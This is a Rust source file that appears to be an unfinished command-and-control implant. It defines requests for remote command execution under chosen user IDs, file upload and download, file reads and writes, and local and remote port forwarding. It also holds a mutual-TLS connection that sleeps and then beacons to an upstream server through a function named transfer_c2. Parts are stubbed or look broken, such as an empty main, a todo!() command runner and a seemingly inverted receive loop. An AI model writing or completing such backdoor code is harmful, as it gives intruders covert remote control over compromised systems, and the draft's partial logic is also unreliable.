use std::{
    io::{self, BufReader, BufWriter, Read, Write},
    net::ToSocketAddrs,
    path::PathBuf,
    process::Command,
    time::Duration,
};

use rustls::{
    pki_types::{pem::PemObject, CertificateDer, PrivateKeyDer, ServerName},
    ClientConfig, ClientConnection, RootCertStore,
};

fn main() {
    loop {}
}

enum ConnectError {
    NoCerts,
    InvalidServerName,
    BadPrivateKey,
    BadConfig,
}
enum Request {
    Exec(Exec),
    PutFile(PutFile),
    GetFile(GetFile),
    OpenFile(OpenFile),
    CloseFile(CloseFile),
    Read(Read),
    Write(Write),
    LocalForward(LocalForward),
    RemoteForward(RemoteForward),
    Shutdown,
    Config(Config),
}

struct Exec {
    command: String,
    args: Vec<String>,
    env: ExecEnv,
    current_dir: Option<PathBuf>,
    uid: Option<u32>,
    guid: Option<u32>,
}

struct ExecEnv {
    add: Vec<(String, String)>,
    remove: Option<Remove>,
}

enum Remove {
    Delete(Vec<String>),
    Clear,
}

fn run_command() {
    todo!()
}

struct Connection {}
impl Connection {
    fn new(
        name: &'static str,
        sleep: Duration,
        upstream_addr: String,
        ca_cert: &[u8],
        client_cert: &'static [u8],
        client_key: &[u8],
    ) -> Result<Self, ConnectError> {
        let mut store = RootCertStore::empty();
        let (added, _) = store.add_parsable_certificates([CertificateDer::from_slice(ca_cert)]);
        if added < 1 {
            return Err(ConnectError::NoCerts);
        }
        let client_cert = vec![CertificateDer::from_slice(client_cert)];
        let client_key =
            PrivateKeyDer::from_pem_slice(client_key).or(Err(ConnectError::BadPrivateKey))?;
        let config = ClientConfig::builder()
            .with_root_certificates(store)
            .with_client_auth_cert(client_cert, client_key)
            .unwrap();
        let name: ServerName = name.try_into().or(Err(ConnectError::InvalidServerName))?;
        let mut ctx =
            ClientConnection::new(config.into(), name).or(Err(ConnectError::BadConfig))?;
        let (tx, rx) = std::sync::mpsc::sync_channel(0);
        std::thread::spawn(move || {
            let mut out_buf = Vec::new();
            let mut in_buf = Vec::new();
            let mut error_count = 0;
            while let Err(e) = rx.recv() {
                std::thread::sleep(sleep);
                if let Err(e) = transfer_c2(&mut ctx, &mut out_buf, &mut in_buf, &upstream_addr) {
                    error_count += 1;
                    continue;
                };
                error_count = 0;
            }
        });
        Ok(Connection {})
    }
}

fn transfer_c2(
    ctx: &mut ClientConnection,
    out_buf: &mut Vec<u8>,
    in_buf: &mut Vec<u8>,
    upstream_addr: impl ToSocketAddrs,
) -> Result<(), io::Error> {
    in_buf.clear();
    out_buf.clear();
    let mut in_size = [0u8; 8];
    let tcp_conn = std::net::TcpStream::connect(&upstream_addr)?;
    tcp_conn.set_read_timeout(Some(Duration::from_secs(10)))?;
    tcp_conn.set_write_timeout(Some(Duration::from_secs(10)))?;
    let mut tcp_conn_write = BufWriter::new(tcp_conn.try_clone()?);
    let mut tcp_conn_read = BufReader::new(tcp_conn);

    let size = ctx.write_tls(out_buf)?;
    tcp_conn_write.write_all(size.to_be_bytes().as_slice());
    io::copy(&mut out_buf.as_slice(), &mut tcp_conn_write);
    tcp_conn_write.flush()?;

    tcp_conn_read.read_exact(&mut in_size)?;
    let size = u64::from_be_bytes(in_size);
    let mut tcp_conn_read = tcp_conn_read.take(size);
    io::copy(&mut tcp_conn_read, in_buf);
    Ok(())
}
